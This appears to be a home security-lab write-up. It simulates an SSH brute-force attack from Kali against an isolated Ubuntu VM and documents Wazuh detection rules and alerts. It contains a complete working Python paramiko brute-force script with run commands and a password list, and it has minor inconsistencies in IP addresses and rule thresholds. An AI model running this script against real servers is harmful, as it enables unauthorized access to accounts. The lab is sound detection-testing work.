# SSH Brute-Force Attack Simulation

## Objective

Simulate a brute-force attack against an SSH server, trigger Wazuh alerts, and document the entire process from attacker script to detection.

## Lab Environment

- **Attacker:** Kali Linux with Hydra and Python Script - `192.168.200.100`
- **Target:** Ubuntu VM with SSH enabled - `192.168.200.3`
- **Monitoring:** Wazuh manager - `192.168.200.2`
- **Network:** Isolated lab subnet `192.168.200.0/24`

---

## 1. Attacker Scripts (Python)

### `ssh_bruteforce.py`

```python
#!/usr/bin/env python3

import paramiko
import time
import sys

def brute_force_ssh(host, port, username, password_list):
    """
    Attempt SSH login using a list of passwords.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"[*] Trying {username}:{password}")
            client.connect(host, port=port, username=username, password=password, timeout=3)
            print(f"[+] SUCCESS! Username: {username} | Password: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
        finally:
            client.close()

    print("[-] Brute-force finished. No valid credentials found.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python ssh_bruteforce.py <target_ip> <port> <username> <password_file>")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password_file = sys.argv[4]

    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Password file {password_file} not found.")
        sys.exit(1)

    brute_force_ssh(target_ip, port, username, passwords)
```

### Usage

```bash
python ssh_bruteforce.py 192.168.200.30 22 desktop1 rockyou.txt
```

> **Note:** Install `paramiko` first: `pip install paramiko`

---

## 2. Target Configuration

### 2.1 Ensure SSH is enabled

```bash
sudo systemctl status ssh
sudo systemctl enable ssh
```

### 2.2 Create a test user (optional)

```bash
sudo useradd -m -s /bin/bash testuser
sudo passwd testuser # set a weak password (e.g., "password123")
```

### 2.3 Check authentication logs

```bash
sudo tail -f /var/log/auth.log
```

---

## 3. Wazuh Detection

### 3.1 Built-in SSH brute-force rule

Wazuh includes rule ID 5760 for multiple failed SSH authentication attempts.

- **Rule 5760** - sshd: Multiple authentication failures.

```bash
root@soc-lab:/var/ossec/ruleset/rules# grep -A 10 "id=\"5760\"" /var/ossec/ruleset/rules/0095-sshd_rules.xml
  <rule id="5760" level="5">
    <if_sid>5700,5716</if_sid>
    <match>Failed password|Failed keyboard|authentication error</match>
    <description>sshd: authentication failed.</description>
    <mitre>
      <id>T1110.001</id>
      <id>T1021.004</id>
    </mitre>
    <group>authentication_failed,gdpr_IV_35.7.d,gdpr_IV_32.2,gpg13_7.1,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_10.2.4,pci_dss_10.2.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
```

### 3.2 Custom rule (already in my lab)
This rule triggers when 3 failed attemps come from the same source IP within 60 seconds:

[100-ssh-bruteforce.xml](https://github.com/martinsaf/home-soc/blob/main/monitoring/wazuh-rules/linux/100-ssh-bruteforce.xml)

---

## 4. Attack Simulation

### 4.1 Prepare password list

Use/create a small sample list for testing:

```bash
echo -e "123456\npassowrd\nadmin\n12345678\nqwerty\npassword123" > test_passwords.txt
```

### 4.2 Run the attack

From the attacker machine:

```bash
python ssh_bruteforce.py 192.168.200.3 22 desktop1 test_passwords.txt
```

### 4.3 Monitor auth.log on target

```bash
sudo tail -f /var/log/auth.log
```

Yout should see failed attempts:

```text
Feb 24 11:30:15 desktop1-VirtualBox sshd[12345]: Failed password for desktop1 from 192.168.200.100 port 54321 ssh2
Feb 24 11:30:17 desktop1-VirtualBox sshd[12346]: Failed password for desktop1 from 192.168.200.100 port 54322 ssh2
```

---

## 5. Detection Results

### 5.1 Wazuh alerts

After 5 failed attempts within 60 seconds, rule **100101** triggers.
Alert details in Wazuh Dashboard:

- **Rule ID:** 100101
- **Level:** 12
- **Description:** SSH brute force detected from source IP 192.168.200.100
- **MITRE:** T1110.001 (Brute Force)

### 5.2 Screenshot

---

## 6. Lessons Learned

- SSH brute-force attacks are noisy - easy to detect with basic log monitoring.
- Python + Paramiko is a simples way to simulate attacks for testing detections.
- Wazuh's `frequency` and `same_srcip` are effective for correlating multiple failures.
- Always use strong passwords or key-based authentication to mitigate this risk.

---

## 7. Next Steps

- Simulate a **slow** brute-force (spread over longer time) to test detection thresholds.
- Add **fail2ban** to the target and show how it blocks the attacker.
- Try the same attack with **Hydra** or **Medusa** for comparison.
- Document a **successful** breach (if weak password is found) and post-exploitation.
